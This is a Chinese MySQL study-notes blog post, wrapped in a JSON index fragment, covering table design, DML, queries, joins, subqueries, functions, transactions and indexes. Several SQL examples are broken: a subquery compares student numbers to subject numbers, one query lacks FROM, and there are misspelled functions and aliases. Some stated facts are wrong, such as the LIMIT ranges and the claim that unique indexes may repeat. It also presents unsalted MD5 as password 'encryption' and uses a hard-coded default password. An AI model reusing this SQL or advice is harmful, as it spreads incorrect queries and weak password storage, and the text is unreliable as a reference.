","date":"2021-04-17","objectID":"/posts/mysql/:7:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"2.3数据库的字段类型（重点） unsigened: 无符号的整数 声明该列不能声明负数 zerofill: 0填充的 10的长度 1 – 0000000001 不足位数用0 填充 自增： 通常理解为自增，自动在上一条记录的基础上+1 通常用来设计唯一的主键 index,必须是整数类似 可以自定义设置主键自增的起始值和步长 非空 NULL not Null 假设设置为 not null，如何不给他赋值，就会报错 NULL 如果不填写，默认为NULL 默认： 设置默认的值！ ","date":"2021-04-17","objectID":"/posts/mysql/:8:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"2.4 创建数据库表 ``--目标:创建一个schoo1数据库 --创建学生表(列,字段)使用SQL 创建 --学号int 登录密码varchar(20)姓名,性别varchar(2),出生日期(datatime)，家庭住址，emai1--注意点，使用英文()，表的名称和字段尽量使用括起来 -- AUTO_ INCREMENT 自增 --字符串使用单引号括起来! --所有的语句后面加，(英文的)，最后一个不用加 -- PRIMARY KEY 主键，一般- 一个表只有一个唯一 -的主键! CREATE DATABASE school CREATE TABLE IF NOT EXISTS `student` ( `id` INT(4) NOT NULL AUTO_INCREMENT COMMENT '学号', `name` VARCHAR(30) NOT NULL DEFAULT '匿名' COMMENT '姓名', `pwd` VARCHAR(20) NOT NULL DEFAULT '123456' COMMENT '密码', `sex` VARCHAR(2) NOT NULL DEFAULT '男' COMMENT '性别', `birthday` DATETIME DEFAULT NULL COMMENT '出生日期', `address` VARCHAR(100) DEFAULT NULL COMMENT '家庭住址', `email` VARCHAR(50) DEFAULT NULL COMMENT '邮箱', PRIMARY KEY (`id`) )ENGINE=INNODB DEFAULT CHARSET=utf8`` 格式 ``CREATE TABLE [IF NOT EXISTS] `表名`（ `字段名` 列类型[属性][索引][注释], `字段名` 列类型[属性][索引][注释], ... `字段名` 列类型[属性][索引][注释] ）[表类型][表的字符集设置][注释]`` 常用命令 `SHOW CREATE DATABASE school -- 查看创建数据库的语句 SHOW CREATE TABLE student -- 查看student数据表的定义语句 DESC student -- 显示表的结构` ","date":"2021-04-17","objectID":"/posts/mysql/:9:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"2.5数据表的类型 `-- 关于数据库引擎 /* INNODB 默认使用 MYISAM 早些年使用 */` MYISAMINNODB事务支持不支持支持数据行锁定不支持支持外键约束不支持支持全文索引支持不支持表空间的大小较小较大，约为MYISAM的两倍 常规使用操作： MYISAM 节约空间，速度较快， INNODB 安全性高，事务处理，多表多用户操作 在物理空间存在的位置 所有的数据库文件都存在data目录下，一个文件夹就对应一个数据库 本质还是文件的存储 MySQL 引擎在物理文件上的区别 innoDB 在数据库表中，只有一个*.frm文件，以及上级目录下的ibdata1文件 MYISAM 对应的文件 *.frm - 表结构的定义文件 *. MYD -数据文件 *.MYI 索引文件 设置数据库字符集编码 `CHARTSET=UTF8` 不设置的话，会是mysql默认的字符集编码-（不支持中文） 可以在my.ini中配置默认的编码 `character-set-server=utf8` ","date":"2021-04-17","objectID":"/posts/mysql/:10:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"2.6修改删除表 修改 `-- 修改表名 ALTER TABLE 旧表面 AS 新表名 ALTER TABLE student RENAME AS student1 -- 增加表的字段 ALTER TABLE 表名 ADD 字段名 列属性 ALTER TABLE student1 ADD age INT(11) -- 修改表的字段（重命名，修改约束） ALTER TABLE student1 MODIFY age VARCHAR(11) -- 修改约束 ALTER TABLE student1 CHANGE age age1 INT(1) -- 字段重命名 -- 删除表的字段 ALTER TABLE student1 DROP age1` 删除 `-- 删除表 DROP TABLE IF EXISTS student1` 所有的创建和删除操作尽量加上判断，以免报错 注意点： `` 字段名，使用这个包裹 注释 – /**/ sql 关键字大小写不敏感，建议写小写 所有的符号全部用英文 3、MySQL数据管理 ","date":"2021-04-17","objectID":"/posts/mysql/:11:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"3.1外键（了解） 方式一：在创建表的时候，增加约束（麻烦，比较复杂） ``CREATE TABLE `grade`( `gradeid` INT(10) NOT NULL AUTO_INCREMENT COMMENT '年级id', `gradename` VARCHAR(50) NOT NULL COMMENT '年级名称', PRIMARY KEY (`gradeid`) )ENGINE=INNODB DEFAULT CHARSET=utf8 -- 学生表的 gradeid 字段 要去引用年级表的gradeid -- 定义外键KEY -- 给这个外键添加约束（执行引用） references 引用 CREATE TABLE IF NOT EXISTS `student` ( `id` INT(4) NOT NULL AUTO_INCREMENT COMMENT '学号', `name` VARCHAR(30) NOT NULL DEFAULT '匿名' COMMENT '姓名', `pwd` VARCHAR(20) NOT NULL DEFAULT '123456' COMMENT '密码', `sex` VARCHAR(2) NOT NULL DEFAULT '男' COMMENT '性别', `birthday` DATETIME DEFAULT NULL COMMENT '出生日期', `gradeid` INT(10) NOT NULL COMMENT '学生年级', `address` VARCHAR(100) DEFAULT NULL COMMENT '家庭住址', `email` VARCHAR(50) DEFAULT NULL COMMENT '邮箱', PRIMARY KEY (`id`), KEY `FK_gardeid` (`gradeid`), CONSTRAINT `FK_gardeid` FOREIGN KEY (`gradeid`) REFERENCES `grade` (gradeid) )ENGINE=INNODB DEFAULT CHARSET=utf8`` 删除有外键关系的表的时候，必须先删除引用的表（从表），再删除被引用的表（主表） 方式二： 创建表成功后添加外键 ``CREATE TABLE `grade`( `gradeid` INT(10) NOT NULL AUTO_INCREMENT COMMENT '年级id', `gradename` VARCHAR(50) NOT NULL COMMENT '年级名称', PRIMARY KEY (`gradeid`) )ENGINE=INNODB DEFAULT CHARSET=utf8 -- 学生表的 gradeid 字段 要去引用年级表的gradeid -- 定义外键KEY -- 给这个外键添加约束（执行引用） references 引用 CREATE TABLE IF NOT EXISTS `student` ( `id` INT(4) NOT NULL AUTO_INCREMENT COMMENT '学号', `name` VARCHAR(30) NOT NULL DEFAULT '匿名' COMMENT '姓名', `pwd` VARCHAR(20) NOT NULL DEFAULT '123456' COMMENT '密码', `sex` VARCHAR(2) NOT NULL DEFAULT '男' COMMENT '性别', `birthday` DATETIME DEFAULT NULL COMMENT '出生日期', `gradeid` INT(10) NOT NULL COMMENT '学生年级', `address` VARCHAR(100) DEFAULT NULL COMMENT '家庭住址', `email` VARCHAR(50) DEFAULT NULL COMMENT '邮箱', PRIMARY KEY (`id`) )ENGINE=INNODB DEFAULT CHARSET=utf8 -- 创建表的时候没有外键关系 ALTER TABLE `student` ADD CONSTRAINT `FK_gradeid` FOREIGN KEY (`gradeid`) REFERENCES `grade`(`gradeid`); -- ALTER TABLE`表` ADD CONSTRAINT 约束名 FOREIGN KEY（作为外键的列） 引用到哪个表的哪个字段`` 以上的操作都是物理外键，数据库级别外键，不建议使用。（避免数据库过多造成困扰） 最佳实践 数据库就是单纯的表，只用来存数据，只有行（","date":"2021-04-17","objectID":"/posts/mysql/:12:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"3.2 DML语言（全记住） 数据库意义：数据存储，数据管理 DML语言：数据操作语言 Insert update delete ","date":"2021-04-17","objectID":"/posts/mysql/:13:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"3.3添加 insert ``-- 插入语句（添加） -- nsert into 表名（[字段一], [字段二]）values('值1'),('值2') INSERT INTO `grade` (`gradename`) VALUES('大四') -- 由于主键自增我们可以省略（如何不写表的字段，他会一一匹配） INSERT INTO `grade` VALUES('大三') INSERT INTO `grade` (`gradeid`,`gradename`) VALUES ('大三','null') -- 一般写插入语句，我们一定要数据和字段一一对应。 -- 插入多个字段 INSERT INTO `grade`(`gradename`) VALUES ('大二'),('大一'); INSERT INTO `student`(`name`) VALUES ('张三') INSERT INTO `student`(`name`,`pwd`,`sex`) VALUES ('张三','aaaaa','男') INSERT INTO `student`(`name`,`pwd`,`sex`) VALUES ('李四','aaaaa','男'),('王五','23232','女')`` 语法：– insert into 表名（[字段一], [字段二]）values(‘值1’),(‘值2’) 注意事项： 1.字段和字段之间用逗号分开 2.字段可以省略，但是后面的值必须一一对应 3.可以同时插入多条数据，VALUES后面的值需要使用，隔开即可 ``INSERT INTO `student`(`name`,`pwd`,`sex`) VALUES ('李四','aaaaa','男'),('王五','23232','女')`` ","date":"2021-04-17","objectID":"/posts/mysql/:14:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"3.4 修改 update 修改谁（条件） set 原来的值=新值 ``-- 修改学员名字 UPDATE `student` SET `name`='囷' WHERE id =1; -- 不指定条件的情况下，会改动所有表 UPDATE `student` SET `name`='233' -- 语法； -- UPDATE 表名 set column_name,[] = value where 条件`` 条件：where 子句 运算符 id 等于 某个值，大于某个值，在某个区间内修改 操作符返回布尔值 操作符含义范围结果=等于5=6false!= \u003c\u003e不等于5！=6true\u003e大于\u003c小于\u003e=\u003c=between and在某个范围内，闭合区间and\u0026\u00265\u003e1and1\u003e2falseor||5\u003e1or1\u003e2true 注意： column_name 是数据库的列，带上`` 条件，是筛选的条件，如果没有指定，则会修改所有的列 value 是一个具体的值，也可以是一个变量 多个设置的属性之间，使用英文逗号隔开 ``UPDATE `student` SET `birthday`=CURRENT_TIME where `name`='李四' AND SEX = '男'`` ","date":"2021-04-17","objectID":"/posts/mysql/:15:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"3.5 删除 delete 命令 语法 delete from 表名 [where 条件] ``-- 删除数据 (避免这样写) DELETE FROM `student` -- 删除指定 DELETE FROM `student` where id= 1`` TRUNCATE 命令 作用：完全清空一个数据库，表的结构和索引不会变 delete 和 TRUNCATE 区别 相同点： 都能删除数据，都不会删除表结构 不同： TRUNCATE 重新设置自增列 计数器会归零 TRUNCATE 不会影响事务 ``-- 测试delete 和 truncate 区别 CREATE TABLE `test`( `id` INT(4) NOT NULL AUTO_INCREMENT, `coll` VARCHAR(20) NOT NULL, PRIMARY KEY (`id`) )ENGINE=INNODB DEFAULT CHARSET=utf8 INSERT INTO `test`(`coll`) VALUES('1'),('2'),('3') DELETE FROM `test` -- 不会影响自增 TRUNCATE TABLE `test` -- 自增会归零`` 了解即可：delete删除的问题 重启数据库，现象 innoDB 自增列会从1开始（存在内存当中，断电即失） MyISAM 继续从上一个自增量开始（存在文件中，不会丢失） 4、DQL查询数据（最重点） ","date":"2021-04-17","objectID":"/posts/mysql/:16:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"4.1DQL (Data Query Language) :数据查询语言 所有的查询操作都用它 Select 简单的查询，复杂的查询它都能做 数据库中最核心的语言 使用频率最高的语言 ","date":"2021-04-17","objectID":"/posts/mysql/:17:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"4.2指定查询字段 ``-- 查询 SELECT 字段 FROM 表 -- 查询指定字段 such as SELECT `StudentNo`,`StudentName` FROM student -- 别名，给结果起一个名字 AS 可以给字段起别名 也可以给表起别名 SELECT `StudentNo` AS 学号,`StudentName`AS 学生姓名 FROM student AS S -- 函数 Concat(a,b) SELECT CONCAT('姓名：',StudentName) AS 新名字 FROM student`` 语法： SELECT 字段 ... FROM 表 有时候，列名字不是那么见名知意。我们起别名 AS 字段名 AS 别名 表名 AS 别名 去重 作用：去除select语句查询出来的结果中重复的语句，重复的语句只显示一条 ``-- 查询一下有哪些同学参加了考试，成绩 SELECT * FROM result -- 查询全部的考试成绩 -- 查询有哪些同学参加了考试 SELECT `studentNo` FROM result -- 发现重复数据，去重 SELECT DISTINCT `studentNo` FROM result`` 数据库的列（表达式） ``SELECT VERSION() --查询系统版本（函数） SELECT 100*3-1 AS 计算结果 -- 用来计算（表达式） SELECT @@auto_increment_increment --查询自增的步长（变量） -- 学员考试成绩+1 分 查看 SELECT `StudentNo`,`StudentResult`+1 AS '提分后' FROM result`` 数据库中的表达式： 文本值，列，Null , 函数，计算表达式，系统变量… select 表达式 from 表 ","date":"2021-04-17","objectID":"/posts/mysql/:18:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"4.3where 条件子句 作用：检索数据中符合条件的值 逻辑运算符 运算符语法结果and \u0026\u0026a and b a\u0026\u0026b逻辑与or ||a or b a||b逻辑或Not !=not a !a逻辑非 尽量使用英文 ``-- 查询考试成绩在95分到100分之间 SELECT `StduentNo`,`StudentResult` FROM result WHERE StudentResult \u003e=95 AND StudentResult\u003c=100 -- 模糊查询（区间） SELECT `StduentNo`,`StudentResult` FROM result WHERE StudentResult BETWEEN 95 AND 100 -- 除了1000号学生之外的同学成绩 SELECT `StduentNo`,`StudentResult` FROM result WHERE NOT StudentNo = 1000`` 模糊查询：比较运算符 运算符语法描述I S NULLa is null如果操作符为null 结果为真IS NOT NULLa is not null如果操作符为not null 结果为真BETWEENa between b and c若a在b 和c之间则为真LIKEa like bSQL匹配，如果a 匹配到b 则为真INa in (a1,a2,a3…)假设a 在 a1,a2,a3其中的某一个中，为真 ``-- 查询姓刘的同学 -- like结合 %（代表0到任意字符） _(一个字符) SELECT `StudentNo`,`StudentName` FROM `student` WHERE StudentName LIKE '刘%'; -- 查询姓刘的同学，名字后只有一个字 SELECT `StudentNo`,`StudentName` FROM `student` WHERE StudentName LIKE '刘_'; -- 查询姓刘的同学，名字后只有两个字 SELECT `StudentNo`,`StudentName` FROM `student` WHERE StudentName LIKE '刘__'; -- 查询名字中间有嘉字的同学 %嘉% SELECT `StudentNo`,`StudentName` FROM `student` WHERE StudentName LIKE '%嘉%'; ===================IN(具体的一个或者多个值)=========================== -- 查询1001 1002 1003 学员信息 SELECT `StudentNo`,`StudentName` FROM `student` WHERE StudentNo = 1001 SELECT `StudentNo`,`StudentName` FROM `student` WHERE StudentNo = 1002 SELECT `StudentNo`,`StudentName` FROM `student` WHERE StudentNo = 1003 SELECT `StudentNo`,`StudentName` FROM `student` WHERE StudentNo IN (1001,1002,1003); -- 查询在北京的学生 SELECT `StudentNo`,`StudentName` FROM `student` WHERE `Address` IN('安徽','河南洛阳'); ===================NULL NOT NULL=================================== -- 查询地址为空的学生 null '' SELECT `StudentNo`,`StudentName` FROM `student` WHERE address=''OR address IS NULL -- 查询有出生日期的同学 不为空 SELECT `StudentNo`,`StudentName` FROM `student` WHERE `BornDate` IS NOT NULL;`` ","date":"2021-04-17","objectID":"/posts/mysql/:19:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"4.4 联表查询 JOIN 对比 `======================联表查询 join ============================== -- 查询参加考试的同学 （学号，姓名，考试编号，分数） SELECT * FROM student SELECT * FROM result /* 1. 分析需求，分析查询的字段来自哪些表 2.确定使用哪种连接查询？7种 确定交叉点（这两个表中哪个数据是相同的） 判断的条件： 学生表中 studentNo = 成绩表中 studentNo */ -- JION（表） ON （判断的条件）连接查询 -- where 等值查询 SELECT studentNo,studentName,SubjectNo,StudentResult FROM student AS s INNER JOIN result AS r WHERE s.studentNo=r.studentNo --Right Join SELECT s.studentNo,studentName,SubjectNo,StudentResult FROM student AS s RIGHT JOIN result AS r ON s.studentNo = r.studentNo --LEFT Join SELECT s.studentNo,studentName,SubjectNo,StudentResult FROM student AS s LEFT JOIN result AS r ON s.studentNo = r.studentNo` 操作描述Inner join如果表中至少有一个匹配，就返回行left join即使左表中没有匹配，也会从左表中返回所有的值right jion即使右表中没有匹配，也会从右表中返回所有的值 ``-- 查询考的同学 SELECT s.studentNo,studentName,SubjectNo,StudentResult FROM student AS s LEFT JOIN result AS r ON s.studentNo = r.studentNo WHERE StudentResult IS NULL -- 查询了参加考试同学的信息：学号：学生姓名：科目名：分数 SELECT s.`studentNo`,`studentName`,`SubjectName`,`studentResult` FROM student s RIGHT JOIN result r ON r.studentNo=s.studentNo INNER JOIN `subject` sub ON r.SubjectNo=sub.SubjectNo -- 我要查询哪些数据 SELECT .... -- 从哪几个表中查 FROM 表 xxx JOIN 连接的表 ON 交叉条件 -- 假设存在一中多张表查询，先查询两章表，然后再慢慢增加 --FROM a LEFT JOIN b 左为准 --FROM a RIGHT JOIN b 右为准`` 自连接 自己的表跟自己的表连接，核心：一张表拆为两张一样的表 父类 categoryidcategoryName2信息技术3软件开发5美术设计 子类 pidcategoryidcategoryName34数据库28办公信息36web开发57ps技术 操作：查询父类对应子类关系 父类子类信息技术办公信息软件开发数据库软件开发web开发美术设计ps技术 ``-- 查询父子信息 SELECT a.`categroryName` AS `父栏目`,b.`categroryName` AS `子栏目` FROM `catgroy` AS a,`catgroy` AS b WHERE a.`categoryid`=b.`pid` `` ``-- 查询学员所属的年级（学号，学生的姓名，年级） SELECT studentNo,studentName,gradeName FROM student s INNER JOIN `grade` g ON s.`GradeId`=g.`GradeId` `` ","date":"2021-04-17","objectID":"/posts/mysql/:20:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"4.5分页和排序 `============================分页 limit 和排序order by================= -- 排序： 升序ASC 降序 DESC SELECT xx FROM xx JOIN xx WHERE xx ORDER BY xx ASC || DESC` 分页 ``-- 为什么要分页 -- 缓解数据库压力，给人的体验更好 -- 分页，每页显示五条数据 -- 语法： limit 当前页，页面的大小 -- limit 0,5 1-5 -- limit 1,5 1-5 -- limit 6,5 SELECT s.`StudentNo`,`StudentName`,`SubjectName`,`StudentResult` FROM student s INNER JOIN `result` r ON s.`StudentNo`=r.`StudentNo` INNER JOIN `subject` sub ON r.`subjectNo`=sub.`subjectNo` WHERE subjectName='数据结构-1' ORDER BY StudentResult ASC LIMIT 0,5 -- 第一页 limit 0,5 -- 第二页 limit 5,5 -- 第三页 limit 10,5 -- 第N页 limit 5*（n-1）,5`` 语法 limit(查询起始下标，pagesize) ","date":"2021-04-17","objectID":"/posts/mysql/:21:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"4.6 子查询 where (这个值是计算出来的) 本质：在where语句中嵌套一个子查询语句 ``-- ===========================where========================= -- 1.查询 数据库结构-1的所有考试结构（学号，科目编号，成绩） 降序 -- 方式一： 连接查询 SELECT `StudentNo`,r.`SubjectName`,`StudentResult` FROM `result` r INNER JOIN `subject` sub ON r.SubjectNo = sun.SubjectNo WHERE subjectName = '数据库结构-1' ORDER BY StudentResult DESC -- 方式二：使用子查询(由里及外) SELECT `StudentNo`,r.`SubjectName`,`StudentResult` FROM `result` WHERE StudentNo=( SELECT SubjectNo FROM `subject` WHERE SubjectName = '数据库结构-1' ) ORDER BY StudentResult DESC -- 分数不少于80分的学生的学号和姓名 SELECT DISTINCT s.`StudentNo`,`StudentName` FROM student s INNER JOIN result r ON r.StudentNo = s.StudentNo WHERE StudentResult\u003e=80 -- 在这个基础上 增加一个科目 ，高等数学-2 SELECT DISTINCT s.`StudentNo`,`StudentName` FROM student s INNER JOIN result r ON r.StudentNo = s.StudentNo WHERE StudentResult\u003e=80 AND `SubjectNo`=( SELECT Subject FROM `subject` WHERE SubjectName='高等数学-2' ) -- 查询课程为 高等数学-2 且分数不小于80分的同学的学号和姓名 SELECT s.`StudentNo`,`StudentName` FROM student s INNER JOIN result r ON s.StudentNo = r.StudentNo INNER JOIN `subject` sub ON r.`SubjectName`='高等数学-2' WHERE `SubjectaName`='高等数学-2' AND StudentResult \u003e=80 -- 再改造 (由里即外) SELECT `StudentNo`,`StudentName` FROM student WHERE StudentNo IN( SELECT StudentNo result WHERE StudentResult \u003e80 AND SubjectNo =( SELECT SubjectNo FROM `subject` WHERE `SubjectaName`='高等数学-2' ) )`` ","date":"2021-04-17","objectID":"/posts/mysql/:22:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"4.7 分组 ``-- 查询不同课程的平均分，最高分，最低分，平均分大于80 -- 核心：（根据不同的课程分组） SELECT `SubjectName`,AVG(StudentResult),MAX(StudentResult) FROM result r INNER JOIN `Subject` sub ON r.SubjectNo=sub.SubjectNo GROUP BY r.SubjectNo -- 通过什么字段来分组 HAVING AVG(StudentResult)\u003e80`` 5、MySQL函数 ","date":"2021-04-17","objectID":"/posts/mysql/:23:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"5.1 常用函数 `-- 数学运算 SELECT ABS(-8) -- 绝对值 SELECT CEILING(9.4) -- 向上取整 SELECT FLOOR(9.4) -- 向下取整 SELECT RAND() -- 返回0-1随机数 SELECT SIGN(-10) -- 判断一个数的符号 0-0 负数返回-1 正数返回1 -- 字符串函数 SELECT CHAR_LENGTH('2323232') -- 返回字符串长度 SELECT CONCAT('我','233') -- 拼接字符串 SELECT INSERT('java',1,2,'cccc') -- 从某个位置开始替换某个长度 SELECT UPPER('abc') SELECT LOWER('ABC') SELECT REPLACE('坚持就能成功','坚持','努力') -- 查询姓 周 的同学 ，改成邹 SELECT REPLACE(studentname,'周','邹') FROM student WHERE studentname LIKE '周%' -- 时间跟日期函数（记住） SELECT CURRENT_DATE() -- 获取当前日期 SELECT CURDATE() -- 获取当前日期 SELECT NOW() -- 获取当前日期 SELECT LOCATIME() -- 本地时间 SELECT SYSDATE() -- 系统时间 SELECT YEAR(NOW()) SELECT MONTH(NOW()) SELECT DAY(NOW()) SELECT HOUR(NOW()) SELECT MINUTE(NOW()) SELECT SECOND(NOW()) -- 系统 SELECT SYSTEM_USER() SELECT USER() SELECT VERSION()` ","date":"2021-04-17","objectID":"/posts/mysql/:24:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"5.2 聚合函数（常用） 函数名称描述COUNT()计数SUM()求和AVG()平均值MAX()最大值MIN()最小值… ","date":"2021-04-17","objectID":"/posts/mysql/:25:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"5.3 数据库级别MD5加密（拓展） 什么是MD5 主要增强算法复杂度不可逆性。 MD5不可逆，具体的MD5是一样的 MD5破解原理，背后有一个字典，MD5加密后的值，加密前的值 ``CREATE TABLE `testmd5`( `id` INT(4) NOT NULL, `name` VARCHAR(20) NOT NULL, `pwd` VARCHAR(50) NOT NULL, PRIMARY KEY (`id`) )ENGINE=INNODB DEFAULT CHARSET=UTF8 -- 明文密码 INSERT INTO testmd5 VALUES(1,'张三','123456'),(2,'李四','123456'),(3,'王五','123456') -- 加密 UPDATE testmd5 SET pwd=MD5(pwd) WHERE id =1 UPDATE testmd5 SET pwd=MD5(pwd) WHERE id !=1 -- 加密全部 -- 插入时加密 INSERT INTO testmd5 VALUES(4,'小明',MD5('123456')) INSERT INTO testmd5 VALUES(5,'红',MD5('123456')) -- 如何校验，将用户传递过来的密码，进行MD5加密，然后对比加密后的值 SELECT * FROM testmd5 WHERE `name`='红' AND pwd=MD5('123456')`` 6、事务 ","date":"2021-04-17","objectID":"/posts/mysql/:26:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"6.1 什么是事务 要么都成功，要么都失败 SQL执行， A给B转账 A 1000–\u003e 200 B200 SQL 执行， B收到A的钱 A800 — B400 将一组SQL放在一个批次中执行 事务原则 ： ACID原则 原子性，一致性，隔离性，持久性 （脏读，幻读…） 原子性（Atomicity） 要么都成功，要么都失败 一致性（Consistency） 事务前后的数据完整性要保持一致 持久性（Durability）–事务提交 事务一旦提交就不可逆转，被持久化到数据库中 隔离性 事务产生多并发时，互不干扰 隔离产生的问题 ","date":"2021-04-17","objectID":"/posts/mysql/:27:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"脏读： 指一个事务读取了另外一个事务未提交的数据。 ","date":"2021-04-17","objectID":"/posts/mysql/:28:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"不可重复读： 在一个事务内读取表中的某一行数据，多次读取结果不同。（这个不一定是错误，只是某些场合不对） ","date":"2021-04-17","objectID":"/posts/mysql/:29:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"虚读(幻读) 是指在一个事务内读取到了别的事务插入的数据，导致前后读取不一致。 （一般是行影响，多了一行） 执行事务 `-- mysql 自动开启事务提交 SET autocommit=0 -- 关闭 SET autocommit=1 -- 开启（默认的） -- 手动处理事务 SET autocommit =0 -- 关闭自动提交 -- 事务开启 START TRANSACTION -- 标记一个事务的开始，从这个之后的SQP都在同一个事务内 INSERT XX INSERT XX -- 提交 ： 持久化(成功) COMMIT -- 回滚： 回到原来的样子（失败） ROLLBACK -- 事务结束 SET autocommit = 1 -- 开启自动提交 -- 了解 SAVEPOINT 保存点名称 -- 设置一个事务的保存点 ROLLBACK TO SAVEPOINT 保存点名 -- 回滚到保存点 RELEASE SAVEPOINT 保存点 -- 删除保存点` [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-DfVvNLP7-1594142971424)(C:\\Users\\53424\\AppData\\Roaming\\Typora\\typora-user-images\\1594012051660.png)] 模拟场景 ``CREATE DATABASE shop CHARACTER SET utf8 COLLATE utf8_general_ci USE shop CREATE TABLE `account`( `id` INT(3) NOT NULL AUTO_INCREMENT, `name` VARCHAR(30) NOT NULL, `money` DECIMAL(9,2) NOT NULL, PRIMARY KEY (`id`) )ENGINE=INNODB DEFAULT CHARSET=utf8 INSERT INTO account(`name`,`money`) VALUES('A',2000),('B',10000) -- 模拟转账：事务 SET autocommit = 0; -- 关闭自动提交 START TRANSACTION -- 开启事务（一组事务） UPDATE account SET money = money-500 WHERE `name` = 'A' -- A 转账给B UPDATE account SET money = money+500 WHERE `name` = 'B' -- B 收到钱 COMMIT ; -- 提交事务 ROLLBACK ; -- 回滚 SET autocommit=1 -- 恢复默认值`` 7、索引 MySQL索引的建立对于MySQL的高效运行是很重要的，索引可以大大提高MySQL的检索速度。 ","date":"2021-04-17","objectID":"/posts/mysql/:30:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"7.1索引的分类 在一个表中，主键索引只能有一个，唯一索引可以有多个 主键索引 （PRIMARY KEY） 唯一的标识，主键不可重复，只能有一个列作为主键 唯一索引 （UNIQUE KEY） 避免重复的列出现，唯一索引可以重复，多个列都可以标识唯一索引 常规索引（KEY/INDEX） 默认的，index,key关键字来设置 全文索引（FULLTEXT） 在特点的数据库引擎下才有，MyISAM 快速定位数据 `-- 索引的使用 -- 1.在创建表的时候给字段增加索引 -- 2.创建完毕后，增加索引 -- 显示所有的索引信息 SHOW INDEX FROM 表 -- 增加一个索引 ALTER TABLE 表 ADD FULLTEXT INDEX 索引名（字段名） -- EXPLAIN 分析sql执行状况 EXPLAIN SELECT * FROM student -- 非全文索引` ","date":"2021-04-17","objectID":"/posts/mysql/:31:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"7.2 测试索引 ``CREATE TABLE `app_user` ( `id` BIGINT(20) UNSIGNED NOT NULL AUTO_INCREMENT, `name` VARCHAR(50) DEFAULT '', `email` VARCHAR(50) NOT NULL, `phone` VARCHAR(20) DEFAULT '', `gender` TINYINT(4) UNSIGNED DEFAULT '0', `password` VARCHAR(100) NOT NULL DEFAULT '', `age` TINYINT(4) DEFAULT NULL, `create_time` DATETIME DEFAULT CURRENT_TIMESTAMP, `update_time` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`id`) ) ENGINE=INNODB DEFAULT CHARSET=utf8 -- 插入100万数据 DELIMITER $$ -- 写函数之前必写 CREATE FUNCTION mock_data() RETURNS INT BEGIN DECLARE num INT DEFAULT 1000000; DECLARE i INT DEFAULT 0; WHILE i\u003cnum DO -- 插入语句 INSERT INTO app_user(`name`,`email`,`phone`,`gender`,`password`,`age`) VALUE(CONCAT('用户',i),'534240118@qq.com',FLOOR (CONCAT('18',RAND()*9999999)),FLOOR (RAND()*2), UUID(),FLOOR (RAND()*100)); SET i = i+1; END WHILE; RETURN i; END; INSERT INTO app_user(`name`,`email`,`phone`,`gender`,`password`,`age`) VALUE(CONCAT('用户',i),'534240118@qq.com',FLOOR (CONCAT('18',RAND()*9999999)),FLOOR (RAND()*2), UUID(),FLOOR (RAND()*100)) SELECT mock_data(); SELECT * FROM app_user WHERE `name`='用户9999' -- 接近半秒 EXPLAIN SELECT * FROM app_user WHERE `name`='用户9999' -- 查询99999条记录 -- id _ 表名_字段名 -- create index on 字段 CREATE INDEX id_app_user_name ON app_user(`name`); -- 0.001 s EXPLAIN SELECT * FROM app_user WHERE `name`='用户9999' -- 查询一条记录`` 索引在小数据的时候，用处不大，但是在大数据的时候，区别十分明显 ","date":"2021-04-17","objectID":"/posts/mysql/:32:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"7.3 索引原则 索引不是越多越好 不要对经常变动的数据加索引 小数据量的表不需要加索引 索引一般加在常用来查询的字段上 索引的数据结构 Hash 类型的索引 Btree: 默认innodb 的数据结构 阅读： http://blog.codinglabs.org/articles/theory-of-mysql-index.html 8、权限管理和备份 ","date":"2021-04-17","objectID":"/posts/mysql/:33:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"8.1用户管理 SQLyog 可视化管理 SQL命令操作 用户表：mysql.user 本质：对这张表进行，增删改查 `-- 创建用户 CREATE USER 用户名 IDENTIFIED BY '密码' CREATE USER sanjin IDENTIFIED BY '123456' -- 修改密码（修改当前密码） SET PASSWORD = PASSWORD('111111') -- 修改密码（修改指定用户密码） SET PASSWORD 